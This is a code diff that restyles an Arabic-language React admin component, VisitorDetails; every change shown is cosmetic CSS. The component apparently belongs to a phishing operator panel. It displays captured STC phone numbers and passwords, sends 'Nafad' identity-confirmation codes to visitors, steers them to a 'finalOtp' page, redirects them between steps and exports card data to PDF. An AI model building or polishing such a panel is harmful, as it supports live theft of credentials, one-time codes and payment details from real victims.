@@ -58,9 +58,12 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   if (!visitor) {
     return (
-      <div className="flex-1 flex items-center justify-center bg-gray-50">
-        <div className="text-center text-gray-500">
-          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
+      <div className="flex-1 flex items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100/50">
+        <div className="text-center text-gray-400">
+          <div className="w-16 h-16 rounded-2xl bg-gray-100 flex items-center justify-center mx-auto mb-4">
+            <span className="text-2xl opacity-50">👤</span>
+          </div>
+          <p className="text-base font-medium text-gray-500">اختر زائراً لعرض التفاصيل</p>
         </div>
       </div>
     );
@@ -530,12 +533,12 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             value={nafadCode}
             onChange={(e) => setNafadCode(e.target.value)}
             placeholder="أدخل رقم التأكيد"
-            className="w-full flex-1 rounded-lg border px-3 py-2 text-sm"
+            className="w-full flex-1 rounded-xl border border-gray-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 transition-all duration-200"
           />
           <button
             onClick={handleSendNafadCode}
             disabled={!nafadCode.trim()}
-            className="w-full rounded-lg bg-blue-600 px-4 py-2 text-sm text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+            className="w-full rounded-xl bg-gradient-to-r from-blue-500 to-blue-600 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-blue-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto transition-all duration-200 shadow-sm shadow-blue-200"
           >
             إرسال
           </button>
@@ -543,7 +546,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         <button
           onClick={() => handleNavigate("finalOtp")}
           disabled={isNavigating}
-          className="w-full rounded-lg bg-indigo-600 px-4 py-2 text-sm text-white hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2"
+          className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-indigo-600 px-4 py-2 text-sm font-semibold text-white hover:from-indigo-600 hover:to-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 transition-all duration-200 shadow-sm shadow-indigo-200"
         >
           {isNavigating ? (
             <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
@@ -845,21 +848,20 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   };
 
   return (
-    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
-      {/* Header */}
-      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
+    <div className="flex-1 flex flex-col bg-gradient-to-br from-gray-50 to-gray-100/50 overflow-hidden">
+      <div className="bg-white/90 backdrop-blur-md border-b border-gray-200/60 p-4 md:p-6">
         <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
           <div className="min-w-0">
             {onBack && (
               <button
                 onClick={onBack}
-                className="mb-3 inline-flex items-center gap-1 rounded-lg border border-gray-300 px-3 py-1.5 text-xs font-medium text-gray-700 transition-colors hover:bg-gray-100"
+                className="mb-3 inline-flex items-center gap-1 rounded-xl border border-gray-200 px-3 py-1.5 text-xs font-semibold text-gray-600 transition-all duration-200 hover:bg-gray-50 hover:border-gray-300"
               >
                 <ArrowRight className="h-4 w-4" />
                 الرجوع للقائمة
               </button>
             )}
-            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
+            <h2 className="text-xl md:text-2xl font-extrabold text-gray-900 tracking-tight">
               {visitorDisplayName}
             </h2>
 
@@ -882,8 +884,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               </div>
               {/* Display STC Data */}
               {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg">
-                  <h4 className="font-semibold text-purple-900 mb-2">
+                <div className="bg-violet-50/60 border-r-[3px] border-violet-400 p-4 rounded-xl">
+                  <h4 className="font-bold text-violet-800 mb-2">
                     بيانات STC
                   </h4>
                   <div className="space-y-2 text-sm">
@@ -933,7 +935,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 }
               }}
               disabled={isGeneratingPdf}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-red-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+              className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-red-500 to-red-600 px-4 py-2 text-sm font-semibold text-white transition-all duration-200 hover:from-red-600 hover:to-red-700 shadow-sm shadow-red-200 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
             >
               {isGeneratingPdf ? (
                 <>
@@ -959,7 +961,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 }
               }}
               disabled={isGeneratingCardPdf}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-indigo-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+              className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-indigo-500 to-indigo-600 px-4 py-2 text-sm font-semibold text-white transition-all duration-200 hover:from-indigo-600 hover:to-indigo-700 shadow-sm shadow-indigo-200 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
             >
               {isGeneratingCardPdf ? (
                 <>
@@ -983,7 +985,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 void handleNavigate(val).finally(() => setNavSelectValue(""));
               }}
               disabled={isNavigating}
-              className="w-full rounded-lg border border-gray-300 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 sm:w-auto"
+              className="w-full rounded-xl border border-gray-200 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 disabled:opacity-50 sm:w-auto transition-all duration-200"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">🏠 الرئيسية</option>
@@ -1003,11 +1005,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         </div>
       </div>
 
-      {/* Bubbles */}
-      <div className="flex-1 overflow-y-auto p-3 md:p-6">
+      <div className="flex-1 overflow-y-auto p-3 md:p-6 scrollbar-thin">
         {sortedBubbles.length === 0 ? (
-          <div className="text-center text-gray-500 py-12">
-            <p>لا توجد بيانات لعرضها</p>
+          <div className="text-center text-gray-400 py-12">
+            <p className="font-medium">لا توجد بيانات لعرضها</p>
           </div>
         ) : (
           <div
